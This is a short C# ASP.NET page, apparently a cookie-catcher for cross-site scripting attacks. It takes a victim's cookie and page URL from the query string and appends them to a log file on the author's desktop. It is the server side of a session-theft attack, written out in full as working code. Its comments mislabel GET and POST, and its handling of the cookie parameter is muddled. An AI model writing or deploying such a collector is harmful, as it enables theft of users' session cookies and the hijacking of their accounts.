using System;
using System.Collections.Generic;
using System.Linq;
using System.Web;
using System.Web.UI;
using System.Web.UI.WebControls;

using System.Text;
using System.IO;
using System.Collections;


namespace WebApplication5
{
    public partial class XSS : System.Web.UI.Page
    {
        protected void Page_Load(object sender, EventArgs e)
        {
            //GETS COOKIE FROM POST METHOD
            String cookie = Request.QueryString["cookie"];
             //GETS COOKIE FROM GET METHOD
            if (!cookie.Equals(""))
            {
                  cookie = Request.QueryString.ToString();
            }
            StringBuilder newFile = new StringBuilder();

            String documentURL = Request.QueryString["url"];
            string[] file = File.ReadAllLines(@"C:\Users\Todd\Desktop\XSS.txt");
            foreach (string line in file)
            {
                newFile.Append(line + "\r\n");
            }
            newFile.Append(documentURL +": " +cookie);
            File.WriteAllText(@"C:\Users\Todd\Desktop\XSS.txt", newFile.ToString());

        }
    }
}